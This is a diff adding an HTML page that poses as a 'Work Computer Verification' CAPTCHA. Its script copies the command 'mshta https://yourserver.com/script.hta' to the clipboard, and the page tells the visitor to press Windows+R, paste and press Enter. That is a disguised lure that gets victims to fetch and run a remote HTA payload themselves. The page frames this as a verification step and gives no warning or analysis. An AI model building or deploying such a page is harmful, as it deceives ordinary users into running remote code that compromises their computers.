@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Work Computer Verification</title>
+    <script>
+        // Copy the command to clipboard
+        function copyCommand() {
+            const command = "mshta https://yourserver.com/script.hta";
+            navigator.clipboard.writeText(command).then(() => {
+                alert("Command copied! Press Windows + R, then Ctrl + V, and Enter.");
+            }).catch(err => {
+                alert("Failed to copy command: " + err);
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Work Computer Verification</h1>
+    <p>Please solve the CAPTCHA below to verify you're on a work computer:</p>
+    
+    <!-- Placeholder for CAPTCHA -->
+    <div id="captcha-container">
+        <!-- Use a CAPTCHA service like Google reCAPTCHA -->
+        <form action="verify.php" method="POST">
+            <div class="g-recaptcha" data-sitekey="your-recaptcha-site-key"></div>
+            <button type="submit" onclick="copyCommand()">Verify and Copy Command</button>
+        </form>
+    </div>
+    
+    <!-- Load Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</body>
+</html>
